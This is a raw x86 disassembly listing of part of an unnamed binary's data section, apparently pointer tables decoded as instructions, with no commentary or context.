  453a85:	add    BYTE PTR ds:0xd000000,cl
  453a8b:	add    BYTE PTR [eax],al
  453a8d:	add    BYTE PTR ds:0xd000000,cl
  453a93:	add    BYTE PTR [eax],al
  453a95:	add    BYTE PTR ds:0xd000000,cl
  453a9b:	add    BYTE PTR [eax],al
  453a9d:	add    BYTE PTR ds:0x0,cl
	...
  453abf:	add    BYTE PTR ds:0xd000000,cl
  453ac5:	add    BYTE PTR [eax],al
  453ac7:	add    BYTE PTR ds:0xd000000,cl
  453acd:	add    BYTE PTR [eax],al
  453acf:	add    BYTE PTR ds:0xd000000,cl
  453ad5:	add    BYTE PTR [eax],al
  453ad7:	add    BYTE PTR ds:0xd000000,cl
  453add:	add    BYTE PTR [eax],al
  453adf:	add    BYTE PTR ds:0xd000000,cl
  453ae5:	add    BYTE PTR [eax],al
  453ae7:	add    BYTE PTR ds:0xd000000,cl
  453aed:	add    BYTE PTR [eax],al
  453aef:	add    BYTE PTR ds:0xd000000,cl
  453af5:	add    BYTE PTR [eax],al
  453af7:	add    BYTE PTR ds:0xd000000,cl
  453afd:	add    BYTE PTR [eax],al
  453aff:	add    BYTE PTR ds:0xd000000,cl
  453b05:	add    BYTE PTR [eax],al
  453b07:	add    BYTE PTR ds:0xd000000,cl
  453b0d:	add    BYTE PTR [eax],al
  453b0f:	add    BYTE PTR ds:0xd000000,cl
  453b15:	add    BYTE PTR [eax],al
  453b17:	add    BYTE PTR ds:0xd000000,cl
  453b1d:	add    BYTE PTR [eax],al
  453b1f:	add    BYTE PTR ds:0x0,cl
	...
  453b41:	add    BYTE PTR ds:0xd000000,cl
  453b47:	add    BYTE PTR [eax],al
  453b49:	add    BYTE PTR ds:0xd000000,cl
  453b4f:	add    BYTE PTR [eax],al
  453b51:	add    BYTE PTR ds:0xd000000,cl
  453b57:	add    BYTE PTR [eax],al
  453b59:	add    BYTE PTR ds:0xd000000,cl
  453b5f:	add    BYTE PTR [eax],al
  453b61:	add    BYTE PTR ds:0xd000000,cl
  453b67:	add    BYTE PTR [eax],al
  453b69:	add    BYTE PTR ds:0xd000000,cl
  453b6f:	add    BYTE PTR [eax],al
  453b71:	add    BYTE PTR ds:0xd000000,cl
  453b77:	add    BYTE PTR [eax],al
  453b79:	add    BYTE PTR ds:0xd000000,cl
  453b7f:	add    BYTE PTR [eax],al
  453b81:	add    BYTE PTR ds:0xd000000,cl
  453b87:	add    BYTE PTR [eax],al
  453b89:	add    BYTE PTR ds:0xd000000,cl
  453b8f:	add    BYTE PTR [eax],al
  453b91:	add    BYTE PTR ds:0xd000000,cl
  453b97:	add    BYTE PTR [eax],al
  453b99:	add    BYTE PTR ds:0xd000000,cl
  453b9f:	add    BYTE PTR [eax],al
  453ba1:	add    BYTE PTR ds:0x0,cl
	...
  453bc3:	add    BYTE PTR ds:0xd000000,cl
  453bc9:	add    BYTE PTR [eax],al
  453bcb:	add    BYTE PTR ds:0xd000000,cl
  453bd1:	add    BYTE PTR [eax],al
  453bd3:	add    BYTE PTR ds:0xd000000,cl
  453bd9:	add    BYTE PTR [eax],al
  453bdb:	add    BYTE PTR ds:0xd000000,cl
  453be1:	add    BYTE PTR [eax],al
  453be3:	add    BYTE PTR ds:0xd000000,cl
  453be9:	add    BYTE PTR [eax],al
  453beb:	add    BYTE PTR ds:0xd000000,cl
  453bf1:	add    BYTE PTR [eax],al
  453bf3:	add    BYTE PTR ds:0xd000000,cl
  453bf9:	add    BYTE PTR [eax],al
  453bfb:	add    BYTE PTR ds:0xd000000,cl
  453c01:	add    BYTE PTR [eax],al
  453c03:	add    BYTE PTR ds:0xd000000,cl
  453c09:	add    BYTE PTR [eax],al
  453c0b:	add    BYTE PTR ds:0xd000000,cl
  453c11:	add    BYTE PTR [eax],al
  453c13:	add    BYTE PTR ds:0xd000000,cl
  453c19:	add    BYTE PTR [eax],al
  453c1b:	add    BYTE PTR ds:0xd000000,cl
  453c21:	add    BYTE PTR [eax],al
  453c23:	add    BYTE PTR ds:0x0,cl
	...
  453c45:	add    BYTE PTR ds:0xd000000,cl
  453c4b:	add    BYTE PTR [eax],al
  453c4d:	add    BYTE PTR ds:0xd000000,cl
  453c53:	add    BYTE PTR [eax],al
  453c55:	add    BYTE PTR ds:0xd000000,cl
  453c5b:	add    BYTE PTR [eax],al
  453c5d:	add    BYTE PTR ds:0xd000000,cl
  453c63:	add    BYTE PTR [eax],al
  453c65:	add    BYTE PTR ds:0xd000000,cl
  453c6b:	add    BYTE PTR [eax],al
  453c6d:	add    BYTE PTR ds:0xd000000,cl
  453c73:	add    BYTE PTR [eax],al
  453c75:	add    BYTE PTR ds:0xd000000,cl
  453c7b:	add    BYTE PTR [eax],al
  453c7d:	add    BYTE PTR ds:0xd000000,cl
  453c83:	add    BYTE PTR [eax],al
  453c85:	add    BYTE PTR ds:0xd000000,cl
  453c8b:	add    BYTE PTR [eax],al
  453c8d:	add    BYTE PTR ds:0xd000000,cl
  453c93:	add    BYTE PTR [eax],al
  453c95:	add    BYTE PTR ds:0xd000000,cl
  453c9b:	add    BYTE PTR [eax],al
  453c9d:	add    BYTE PTR ds:0xd000000,cl
  453ca3:	add    BYTE PTR [eax],al
  453ca5:	add    BYTE PTR ds:0x0,cl
	...
  453cc7:	add    BYTE PTR ds:0xd000000,cl
  453ccd:	add    BYTE PTR [eax],al
  453ccf:	add    BYTE PTR ds:0xd000000,cl
  453cd5:	add    BYTE PTR [eax],al
  453cd7:	add    BYTE PTR ds:0xd000000,cl
  453cdd:	add    BYTE PTR [eax],al
  453cdf:	add    BYTE PTR ds:0xd000000,cl
  453ce5:	add    BYTE PTR [eax],al
  453ce7:	add    BYTE PTR ds:0xd000000,cl
  453ced:	add    BYTE PTR [eax],al
  453cef:	add    BYTE PTR ds:0xd000000,cl
  453cf5:	add    BYTE PTR [eax],al
  453cf7:	add    BYTE PTR ds:0xd000000,cl
  453cfd:	add    BYTE PTR [eax],al
  453cff:	add    BYTE PTR ds:0xd000000,cl
  453d05:	add    BYTE PTR [eax],al
  453d07:	add    BYTE PTR ds:0xd000000,cl
  453d0d:	add    BYTE PTR [eax],al
  453d0f:	add    BYTE PTR ds:0xd000000,cl
  453d15:	add    BYTE PTR [eax],al
  453d17:	add    BYTE PTR ds:0xd000000,cl
  453d1d:	add    BYTE PTR [eax],al
  453d1f:	add    BYTE PTR ds:0xd000000,cl
  453d25:	add    BYTE PTR [eax],al
  453d27:	add    BYTE PTR ds:0x0,cl
	...
  453d49:	add    BYTE PTR ds:0xd000000,cl
  453d4f:	add    BYTE PTR [eax],al
  453d51:	add    BYTE PTR ds:0xd000000,cl
  453d57:	add    BYTE PTR [eax],al
  453d59:	add    BYTE PTR ds:0xd000000,cl
  453d5f:	add    BYTE PTR [eax],al
  453d61:	add    BYTE PTR ds:0xd000000,cl
  453d67:	add    BYTE PTR [eax],al
  453d69:	add    BYTE PTR ds:0xd000000,cl
  453d6f:	add    BYTE PTR [eax],al
  453d71:	add    BYTE PTR ds:0xd000000,cl
  453d77:	add    BYTE PTR [eax],al
  453d79:	add    BYTE PTR ds:0xd000000,cl
  453d7f:	add    BYTE PTR [eax],al
  453d81:	add    BYTE PTR ds:0xd000000,cl
  453d87:	add    BYTE PTR [eax],al
  453d89:	add    BYTE PTR ds:0xd000000,cl
  453d8f:	add    BYTE PTR [eax],al
  453d91:	add    BYTE PTR ds:0xd000000,cl
  453d97:	add    BYTE PTR [eax],al
  453d99:	add    BYTE PTR ds:0xd000000,cl
  453d9f:	add    BYTE PTR [eax],al
  453da1:	add    BYTE PTR ds:0xd000000,cl
  453da7:	add    BYTE PTR [eax],al
  453da9:	add    BYTE PTR ds:0x0,cl
	...
  453dcb:	add    BYTE PTR ds:0xd000000,cl
  453dd1:	add    BYTE PTR [eax],al
  453dd3:	add    BYTE PTR ds:0xd000000,cl
  453dd9:	add    BYTE PTR [eax],al
  453ddb:	add    BYTE PTR ds:0xd000000,cl
  453de1:	add    BYTE PTR [eax],al
  453de3:	add    BYTE PTR [ebx+ebp*2+0x6bc00045],bh
  453dea:	inc    ebp
  453deb:	add    ah,al
  453ded:	imul   eax,DWORD PTR [ebp+0x0],0xffffffc8
  453df1:	imul   eax,DWORD PTR [ebp+0x0],0xffffffcc
  453df5:	imul   eax,DWORD PTR [ebp+0x0],0xffffffd0
  453df9:	imul   eax,DWORD PTR [ebp+0x0],0xffffffd4
  453dfd:	imul   eax,DWORD PTR [ebp+0x0],0xffffffd8
  453e01:	imul   eax,DWORD PTR [ebp+0x0],0xffffffdc
  453e05:	imul   eax,DWORD PTR [ebp+0x0],0xffffffe0
  453e09:	imul   eax,DWORD PTR [ebp+0x0],0xffffffe4
  453e0d:	imul   eax,DWORD PTR [ebp+0x0],0xffffffe8
  453e11:	imul   eax,DWORD PTR [ebp+0x0],0xffffffec
  453e15:	imul   eax,DWORD PTR [ebp+0x0],0xfffffff0
  453e19:	imul   eax,DWORD PTR [ebp+0x0],0xfffffff4
  453e1d:	imul   eax,DWORD PTR [ebp+0x0],0xfffffff8
  453e21:	imul   eax,DWORD PTR [ebp+0x0],0xfffffffc
  453e25:	imul   eax,DWORD PTR [ebp+0x0],0x0
  453e29:	ins    BYTE PTR es:[edi],dx
  453e2a:	inc    ebp
  453e2b:	add    BYTE PTR [esp+ebp*2],al
  453e2e:	inc    ebp
  453e2f:	add    BYTE PTR [eax],cl
  453e31:	ins    BYTE PTR es:[edi],dx
  453e32:	inc    ebp
  453e33:	add    BYTE PTR [esp+ebp*2],cl
  453e36:	inc    ebp
  453e37:	add    al,ch
  453e39:	imul   eax,DWORD PTR [ebp+0x0],0x10
  453e3d:	ins    BYTE PTR es:[edi],dx
  453e3e:	inc    ebp
  453e3f:	add    BYTE PTR [esp+ebp*2],dl
  453e42:	inc    ebp
  453e43:	add    ah,bl
  453e45:	imul   eax,DWORD PTR [ebp+0x0],0x18
  453e49:	ins    BYTE PTR es:[edi],dx
  453e4a:	inc    ebp
  453e4b:	add    ah,cl
  453e4d:	imul   eax,DWORD PTR [ebp+0x0],0x1c
  453e51:	ins    BYTE PTR es:[edi],dx
  453e52:	inc    ebp
  453e53:	add    BYTE PTR [eax],ah
  453e55:	ins    BYTE PTR es:[edi],dx
  453e56:	inc    ebp
  453e57:	add    BYTE PTR [esp+ebp*2],ah
  453e5a:	inc    ebp
  453e5b:	add    BYTE PTR [eax],ch
  453e5d:	ins    BYTE PTR es:[edi],dx
  453e5e:	inc    ebp
  453e5f:	add    BYTE PTR [esp+ebp*2],ch
  453e62:	inc    ebp
  453e63:	add    BYTE PTR [eax],dh
  453e65:	ins    BYTE PTR es:[edi],dx
  453e66:	inc    ebp
  453e67:	add    BYTE PTR [esp+ebp*2],dh
  453e6a:	inc    ebp
  453e6b:	add    BYTE PTR [eax],bh
  453e6d:	ins    BYTE PTR es:[edi],dx
  453e6e:	inc    ebp
  453e6f:	add    BYTE PTR [esp+ebp*2],bh
  453e72:	inc    ebp
  453e73:	add    BYTE PTR [eax+0x6c],al
  453e76:	inc    ebp
  453e77:	add    ah,ah
  453e79:	imul   eax,DWORD PTR [ebp+0x0],0xffffffec
  453e7d:	imul   eax,DWORD PTR [ebp+0x0],0x4
  453e81:	ins    BYTE PTR es:[edi],dx
  453e82:	inc    ebp
  453e83:	add    BYTE PTR [esp+ebp*2+0x45],al
  453e87:	add    BYTE PTR [eax+0x6c],cl
  453e8a:	inc    ebp
  453e8b:	add    BYTE PTR [esp+ebp*2+0x45],cl
  453e8f:	add    BYTE PTR [eax+0x6c],dl
  453e92:	inc    ebp
  453e93:	add    BYTE PTR [esp+ebp*2+0x45],dl
  453e97:	add    BYTE PTR [eax+0x6c],bl
  453e9a:	inc    ebp
  453e9b:	add    BYTE PTR [esp+ebp*2+0x45],bl
  453e9f:	add    BYTE PTR [eax+0x6c],ah
  453ea2:	inc    ebp
  453ea3:	add    BYTE PTR [esp+ebp*2+0x45],ah
  453ea7:	add    BYTE PTR [eax+0x6c],ch
  453eaa:	inc    ebp
  453eab:	add    BYTE PTR [esp+ebp*2+0x45],ch
  453eaf:	add    BYTE PTR [eax+0x6c],dh
  453eb2:	inc    ebp
  453eb3:	add    BYTE PTR [esp+ebp*2+0x45],dh
  453eb7:	add    BYTE PTR [eax+0x6c],bh
  453eba:	inc    ebp
  453ebb:	add    BYTE PTR [esp+ebp*2+0x45],bh
  453ebf:	add    BYTE PTR [eax+0x2800456c],al
  453ec5:	ins    BYTE PTR es:[edi],dx
  453ec6:	inc    ebp
  453ec7:	add    BYTE PTR [esp+ebp*2+0x6c880045],al
  453ece:	inc    ebp
  453ecf:	add    BYTE PTR [esp+ebp*2+0x6c440045],cl
  453ed6:	inc    ebp
  453ed7:	add    BYTE PTR [eax-0x6bffba94],dl
  453edd:	ins    BYTE PTR es:[edi],dx
  453ede:	inc    ebp
  453edf:	add    BYTE PTR [eax+0x2400456c],bl
  453ee5:	ins    BYTE PTR es:[edi],dx
  453ee6:	inc    ebp
  453ee7:	add    BYTE PTR [esp+ebp*2+0x6ca00045],bl
  453eee:	inc    ebp
  453eef:	add    BYTE PTR [esp+ebp*2+0x6ca80045],ah
  453ef6:	inc    ebp
  453ef7:	add    BYTE PTR [esp+ebp*2+0x6cb00045],ch
  453efe:	inc    ebp
  453eff:	add    BYTE PTR [esp+ebp*2+0x6be40045],dh
  453f06:	inc    ebp
  453f07:	add    ah,al
  453f09:	imul   eax,DWORD PTR [ebp+0x0],0xffffffb8
  453f0d:	ins    BYTE PTR es:[edi],dx
  453f0e:	inc    ebp
  453f0f:	add    BYTE PTR [eax],cl
  453f11:	ins    BYTE PTR es:[edi],dx
  453f12:	inc    ebp
  453f13:	add    al,bl
  453f15:	imul   eax,DWORD PTR [ebp+0x0],0x34
  453f19:	ins    BYTE PTR es:[edi],dx
  453f1a:	inc    ebp
  453f1b:	add    BYTE PTR [eax],al
  453f1d:	ins    BYTE PTR es:[edi],dx
  453f1e:	inc    ebp
  453f1f:	add    BYTE PTR [esp+ebp*2+0x6cc00045],bh
  453f26:	inc    ebp
  453f27:	add    ah,al
  453f29:	ins    BYTE PTR es:[edi],dx
  453f2a:	inc    ebp
  453f2b:	add    al,cl
  453f2d:	ins    BYTE PTR es:[edi],dx
  453f2e:	inc    ebp
  453f2f:	add    BYTE PTR [esp+ebp*2+0x45],ah
  453f33:	add    ah,cl
  453f35:	ins    BYTE PTR es:[edi],dx
  453f36:	inc    ebp
  453f37:	add    al,dl
  453f39:	ins    BYTE PTR es:[edi],dx
  453f3a:	inc    ebp
  453f3b:	add    ah,dl
  453f3d:	ins    BYTE PTR es:[edi],dx
  453f3e:	inc    ebp
  453f3f:	add    BYTE PTR [esp+ebp*2+0x45],ch
  453f43:	add    al,bl
  453f45:	ins    BYTE PTR es:[edi],dx
  453f46:	inc    ebp
  453f47:	add    al,ch
  453f49:	imul   eax,DWORD PTR [ebp+0x0],0xffffffdc
  453f4d:	ins    BYTE PTR es:[edi],dx
  453f4e:	inc    ebp
  453f4f:	add    al,ah
  453f51:	ins    BYTE PTR es:[edi],dx
  453f52:	inc    ebp
  453f53:	add    ah,ah
  453f55:	ins    BYTE PTR es:[edi],dx
  453f56:	inc    ebp
  453f57:	add    al,ch
  453f59:	ins    BYTE PTR es:[edi],dx
  453f5a:	inc    ebp
  453f5b:	add    ah,ch
  453f5d:	ins    BYTE PTR es:[edi],dx
  453f5e:	inc    ebp
  453f5f:	add    al,dh
  453f61:	ins    BYTE PTR es:[edi],dx
  453f62:	inc    ebp
  453f63:	add    ah,dh
  453f65:	ins    BYTE PTR es:[edi],dx
  453f66:	inc    ebp
  453f67:	add    al,bh
  453f69:	ins    BYTE PTR es:[edi],dx
  453f6a:	inc    ebp
  453f6b:	add    ah,bh
  453f6d:	ins    BYTE PTR es:[edi],dx
  453f6e:	inc    ebp
  453f6f:	add    BYTE PTR [eax+0x456c],bl
  453f75:	ins    DWORD PTR es:[edi],dx
  453f76:	inc    ebp
  453f77:	add    BYTE PTR [ebp*2+0x6d080045],al
  453f7e:	inc    ebp
  453f7f:	add    BYTE PTR [esp+ebp*2+0x45],bh
  453f83:	add    al,bl
  453f85:	ins    BYTE PTR es:[edi],dx
  453f86:	inc    ebp
  453f87:	add    BYTE PTR [ebp*2+0x6d100045],cl
  453f8e:	inc    ebp
  453f8f:	add    BYTE PTR [ebp*2+0x6d180045],dl
  453f96:	inc    ebp
  453f97:	add    ah,dl
  453f99:	imul   eax,DWORD PTR [ebp+0x0],0xffffffe8
  453f9d:	imul   eax,DWORD PTR [ebp+0x0],0x1c
  453fa1:	ins    DWORD PTR es:[edi],dx
  453fa2:	inc    ebp
  453fa3:	add    BYTE PTR [esp+ebp*2+0x45],ah
  453fa7:	add    al,bh
  453fa9:	imul   eax,DWORD PTR [ebp+0x0],0x2c
  453fad:	ins    BYTE PTR es:[edi],dx
  453fae:	inc    ebp
  453faf:	add    ah,bl
  453fb1:	ins    BYTE PTR es:[edi],dx
  453fb2:	inc    ebp
  453fb3:	add    ah,al
  453fb5:	ins    BYTE PTR es:[edi],dx
  453fb6:	inc    ebp
  453fb7:	add    BYTE PTR [eax],ah
  453fb9:	ins    DWORD PTR es:[edi],dx
  453fba:	inc    ebp
  453fbb:	add    BYTE PTR [ebp*2+0x6ccc0045],ah
  453fc2:	inc    ebp
  453fc3:	add    BYTE PTR [eax],ch
  453fc5:	ins    DWORD PTR es:[edi],dx
  453fc6:	inc    ebp
  453fc7:	add    BYTE PTR [ebp*2+0x6d300045],ch
  453fce:	inc    ebp
  453fcf:	add    BYTE PTR [ebp*2+0x6d240045],dh
  453fd6:	inc    ebp
  453fd7:	add    al,bh
  453fd9:	imul   eax,DWORD PTR [ebp+0x0],0x38
  453fdd:	ins    DWORD PTR es:[edi],dx
  453fde:	inc    ebp
  453fdf:	add    BYTE PTR [ebp*2+0x6d400045],bh
  453fe6:	inc    ebp
  453fe7:	add    BYTE PTR [eax+0x4400456c],ch
  453fed:	ins    DWORD PTR es:[edi],dx
  453fee:	inc    ebp
  453fef:	add    BYTE PTR [ebp*2+0x6c740045],bh
  453ff6:	inc    ebp
  453ff7:	add    BYTE PTR [esp+ebp*2+0x6d480045],ah
  453ffe:	inc    ebp
  453fff:	add    BYTE PTR [ebp+ebp*2+0x45],cl
  454003:	add    BYTE PTR [eax+0x6d],dl
  454006:	inc    ebp
  454007:	add    BYTE PTR [ebp+ebp*2+0x45],dl
  45400b:	add    BYTE PTR [eax+0x6d],bl
  45400e:	inc    ebp
  45400f:	add    BYTE PTR [ebp+ebp*2+0x45],bl
  454013:	add    BYTE PTR [eax+0x6d],ah
  454016:	inc    ebp
  454017:	add    BYTE PTR [ebp+ebp*2+0x45],ah
  45401b:	add    ah,ch
  45401d:	ins    BYTE PTR es:[edi],dx
  45401e:	inc    ebp
  45401f:	add    al,dh
  454021:	imul   eax,DWORD PTR [ebp+0x0],0x68
  454025:	ins    DWORD PTR es:[edi],dx
  454026:	inc    ebp
  454027:	add    BYTE PTR [ebp+ebp*2+0x45],ch
  45402b:	add    BYTE PTR [eax+0x6d],dh
  45402e:	inc    ebp
  45402f:	add    BYTE PTR [ebp+ebp*2+0x45],dh
  454033:	add    BYTE PTR [eax+0x6d],bh
  454036:	inc    ebp
  454037:	add    BYTE PTR [ebp+ebp*2+0x45],bh
  45403b:	add    BYTE PTR [esp+ebp*2+0x45],ch
  45403f:	add    BYTE PTR [eax-0x2fffba94],bh
  454045:	ins    BYTE PTR es:[edi],dx
  454046:	inc    ebp
  454047:	add    BYTE PTR [eax-0x53ffba94],dh
  45404d:	ins    BYTE PTR es:[edi],dx
  45404e:	inc    ebp
  45404f:	add    BYTE PTR [eax-0x7bffba93],al
  454055:	ins    DWORD PTR es:[edi],dx
  454056:	inc    ebp
  454057:	add    BYTE PTR [eax+0x1800456d],cl
  45405d:	ins    BYTE PTR es:[edi],dx
  45405e:	inc    ebp
  45405f:	add    BYTE PTR [eax+0x6c],dh
  454062:	inc    ebp
  454063:	add    BYTE PTR [ebp+ebp*2+0x6cc80045],cl
  45406a:	inc    ebp
  45406b:	add    BYTE PTR [eax-0x1bffba93],dl
  454071:	imul   eax,DWORD PTR [ebp+0x0],0xffffff94
  454075:	ins    DWORD PTR es:[edi],dx
  454076:	inc    ebp
  454077:	add    BYTE PTR [eax-0x63ffba93],bl
  45407d:	ins    DWORD PTR es:[edi],dx
  45407e:	inc    ebp
  45407f:	add    BYTE PTR [eax-0x5bffba93],ah
  454085:	ins    DWORD PTR es:[edi],dx
  454086:	inc    ebp
  454087:	add    BYTE PTR [esp+ebp*2+0x6da80045],dh
  45408e:	inc    ebp
  45408f:	add    BYTE PTR [ebp+ebp*2+0x6db00045],ch
  454096:	inc    ebp
  454097:	add    BYTE PTR [ebp+ebp*2+0x6db80045],dh
  45409e:	inc    ebp
  45409f:	add    BYTE PTR [eax-0x43ffba93],ch
  4540a5:	ins    DWORD PTR es:[edi],dx
  4540a6:	inc    ebp
  4540a7:	add    al,al
  4540a9:	ins    DWORD PTR es:[edi],dx
  4540aa:	inc    ebp
  4540ab:	add    BYTE PTR [eax-0x3bffba93],ch
  4540b1:	ins    DWORD PTR es:[edi],dx
  4540b2:	inc    ebp
  4540b3:	add    BYTE PTR [esp+ebp*2+0x45],dl
  4540b7:	add    al,bh
  4540b9:	ins    BYTE PTR es:[edi],dx
  4540ba:	inc    ebp
  4540bb:	add    BYTE PTR [eax+0x400456d],dl
  4540c1:	ins    DWORD PTR es:[edi],dx
  4540c2:	inc    ebp
  4540c3:	add    al,cl
  4540c5:	ins    DWORD PTR es:[edi],dx
  4540c6:	inc    ebp
  4540c7:	add    ah,cl
  4540c9:	ins    DWORD PTR es:[edi],dx
  4540ca:	inc    ebp
  4540cb:	add    al,dl
  4540cd:	ins    DWORD PTR es:[edi],dx
  4540ce:	inc    ebp
  4540cf:	add    ah,dl
  4540d1:	ins    BYTE PTR es:[edi],dx
  4540d2:	inc    ebp
  4540d3:	add    ah,dl
  4540d5:	ins    DWORD PTR es:[edi],dx
  4540d6:	inc    ebp
  4540d7:	add    al,bl
  4540d9:	ins    DWORD PTR es:[edi],dx
  4540da:	inc    ebp
  4540db:	add    BYTE PTR [eax],al
  4540dd:	ins    BYTE PTR es:[edi],dx
  4540de:	inc    ebp
  4540df:	add    BYTE PTR [esp+ebp*2+0x6ddc0045],ah
  4540e6:	inc    ebp
  4540e7:	add    al,ah
  4540e9:	ins    DWORD PTR es:[edi],dx
  4540ea:	inc    ebp
  4540eb:	add    al,cl
  4540ed:	imul   eax,DWORD PTR [ebp+0x0],0xffffffe4
  4540f1:	ins    DWORD PTR es:[edi],dx
  4540f2:	inc    ebp
  4540f3:	add    al,ch
  4540f5:	ins    DWORD PTR es:[edi],dx
  4540f6:	inc    ebp
  4540f7:	add    ah,ch
  4540f9:	ins    DWORD PTR es:[edi],dx
  4540fa:	inc    ebp
  4540fb:	add    al,dh
  4540fd:	ins    DWORD PTR es:[edi],dx
  4540fe:	inc    ebp
  4540ff:	add    BYTE PTR [eax+0x6c],dh
  454102:	inc    ebp
  454103:	add    ah,dh
  454105:	ins    DWORD PTR es:[edi],dx
  454106:	inc    ebp
  454107:	add    al,bh
  454109:	ins    DWORD PTR es:[edi],dx
  45410a:	inc    ebp
  45410b:	add    ah,bh
  45410d:	ins    DWORD PTR es:[edi],dx
  45410e:	inc    ebp
  45410f:	add    BYTE PTR [eax],al
  454111:	outs   dx,BYTE PTR ds:[esi]
  454112:	inc    ebp
  454113:	add    BYTE PTR [esi+ebp*2],al
  454116:	inc    ebp
  454117:	add    al,al
  454119:	ins    BYTE PTR es:[edi],dx
  45411a:	inc    ebp
  45411b:	add    BYTE PTR [eax],cl
  45411d:	outs   dx,BYTE PTR ds:[esi]
  45411e:	inc    ebp
  45411f:	add    BYTE PTR [esi+ebp*2],cl
  454122:	inc    ebp
  454123:	add    BYTE PTR [eax+0x1000456d],bh
  454129:	outs   dx,BYTE PTR ds:[esi]
  45412a:	inc    ebp
  45412b:	add    BYTE PTR [eax+0x7400456d],bl
  454131:	ins    DWORD PTR es:[edi],dx
  454132:	inc    ebp
  454133:	add    al,dl
  454135:	ins    DWORD PTR es:[edi],dx
  454136:	inc    ebp
  454137:	add    BYTE PTR [esi+ebp*2],dl
  45413a:	inc    ebp
  45413b:	add    BYTE PTR [eax],bl
  45413d:	outs   dx,BYTE PTR ds:[esi]
  45413e:	inc    ebp
  45413f:	add    BYTE PTR [ebp+ebp*2+0x6cfc0045],cl
  454146:	inc    ebp
  454147:	add    BYTE PTR [eax+0x6c],cl
  45414a:	inc    ebp
  45414b:	add    al,dl
  45414d:	imul   eax,DWORD PTR [ebp+0x0],0x58
  454151:	ins    DWORD PTR es:[edi],dx
  454152:	inc    ebp
  454153:	add    BYTE PTR [eax+0x1c00456c],cl
  454159:	outs   dx,BYTE PTR ds:[esi]
  45415a:	inc    ebp
  45415b:	add    BYTE PTR [ebp+ebp*2+0x6c340045],bl
  454162:	inc    ebp
  454163:	add    BYTE PTR [eax],cl
  454165:	outs   dx,BYTE PTR ds:[esi]
  454166:	inc    ebp
  454167:	add    BYTE PTR [eax],ah
  454169:	outs   dx,BYTE PTR ds:[esi]
  45416a:	inc    ebp
  45416b:	add    BYTE PTR [esp+ebp*2+0x6cb00045],dh
  454172:	inc    ebp
  454173:	add    BYTE PTR [esp+ebp*2+0x45],dl
  454177:	add    BYTE PTR [esi+ebp*2],ah
  45417a:	inc    ebp
  45417b:	add    BYTE PTR [eax],ch
  45417d:	outs   dx,BYTE PTR ds:[esi]
  45417e:	inc    ebp
  45417f:	add    al,dh
  454181:	imul   eax,DWORD PTR [ebp+0x0],0xffffffc8
  454185:	ins    DWORD PTR es:[edi],dx
  454186:	inc    ebp
  454187:	add    BYTE PTR [esi+ebp*2],ch
  45418a:	inc    ebp
  45418b:	add    BYTE PTR [eax],dh
  45418d:	outs   dx,BYTE PTR ds:[esi]
  45418e:	inc    ebp
  45418f:	add    BYTE PTR [esp+ebp*2+0x6e340045],ch
  454196:	inc    ebp
  454197:	add    BYTE PTR [eax],bh
  454199:	outs   dx,BYTE PTR ds:[esi]
  45419a:	inc    ebp
  45419b:	add    ah,dl
  45419d:	ins    BYTE PTR es:[edi],dx
  45419e:	inc    ebp
  45419f:	add    BYTE PTR [esi+ebp*2],bh
  4541a2:	inc    ebp
  4541a3:	add    al,dl
  4541a5:	addr16 inc ebp
  4541a7:	add    ah,dl
  4541a9:	addr16 inc ebp
  4541ab:	add    al,bl
  4541ad:	addr16 inc ebp
  4541af:	add    ah,bl
  4541b1:	addr16 inc ebp
  4541b3:	add    al,ah
  4541b5:	addr16 inc ebp
  4541b7:	add    ah,ah
  4541b9:	addr16 inc ebp
  4541bb:	add    al,ch
  4541bd:	addr16 inc ebp
  4541bf:	add    ah,ch
  4541c1:	addr16 inc ebp
  4541c3:	add    al,dh
  4541c5:	addr16 inc ebp
  4541c7:	add    ah,dh
  4541c9:	addr16 inc ebp
  4541cb:	add    al,bh
  4541cd:	addr16 inc ebp
  4541cf:	add    ah,bh
  4541d1:	addr16 inc ebp
  4541d3:	add    BYTE PTR [eax],al
  4541d5:	push   0x68040045
  4541da:	inc    ebp
  4541db:	add    BYTE PTR [eax],cl
  4541dd:	push   0x680c0045
  4541e2:	inc    ebp
  4541e3:	add    BYTE PTR [eax],dl
  4541e5:	push   0x68140045
  4541ea:	inc    ebp
  4541eb:	add    BYTE PTR [eax],bl
  4541ed:	push   0x681c0045
  4541f2:	inc    ebp
  4541f3:	add    BYTE PTR [eax],ah
  4541f5:	push   0x68240045
  4541fa:	inc    ebp
  4541fb:	add    BYTE PTR [eax],ch
  4541fd:	push   0x682c0045
  454202:	inc    ebp
  454203:	add    BYTE PTR [eax],dh
  454205:	push   0x68340045
  45420a:	inc    ebp
  45420b:	add    BYTE PTR [eax],bh
  45420d:	push   0x683c0045
  454212:	inc    ebp
  454213:	add    BYTE PTR [eax+0x68],al
  454216:	inc    ebp
  454217:	add    BYTE PTR [eax+ebp*2+0x45],al
  45421b:	add    BYTE PTR [eax+0x68],cl
  45421e:	inc    ebp
  45421f:	add    BYTE PTR [eax+ebp*2+0x45],cl
  454223:	add    BYTE PTR [eax+0x68],dl
  454226:	inc    ebp
  454227:	add    BYTE PTR [eax+ebp*2+0x45],dl
  45422b:	add    BYTE PTR [eax+0x68],bl
  45422e:	inc    ebp
  45422f:	add    BYTE PTR [eax+ebp*2+0x45],bl
  454233:	add    BYTE PTR [eax+0x68],ah
  454236:	inc    ebp
  454237:	add    BYTE PTR [eax+ebp*2+0x45],ah
  45423b:	add    BYTE PTR [eax+0x68],ch
  45423e:	inc    ebp
  45423f:	add    BYTE PTR [eax+ebp*2+0x45],ch
  454243:	add    BYTE PTR [eax+0x68],dh
  454246:	inc    ebp
  454247:	add    BYTE PTR [eax+ebp*2+0x45],dh
  45424b:	add    BYTE PTR [eax+0x68],bh
  45424e:	inc    ebp
  45424f:	add    BYTE PTR [eax+ebp*2+0x45],bh
  454253:	add    BYTE PTR [eax-0x7bffba98],al
  454259:	push   0x68880045
  45425e:	inc    ebp
  45425f:	add    BYTE PTR [eax+ebp*2+0x45],ah
  454263:	add    BYTE PTR [eax+ebp*2+0x68900045],cl
  45426a:	inc    ebp
  45426b:	add    BYTE PTR [eax+ebp*2+0x68980045],dl
  454272:	inc    ebp
  454273:	add    BYTE PTR [eax+ebp*2+0x68780045],bl
  45427a:	inc    ebp
  45427b:	add    BYTE PTR [eax-0x5bffba98],ah
  454281:	push   0x68a80045
  454286:	inc    ebp
  454287:	add    BYTE PTR [eax+ebp*2+0x68b00045],ch
  45428e:	inc    ebp
  45428f:	add    BYTE PTR [eax+ebp*2+0x68b80045],dh
  454296:	inc    ebp
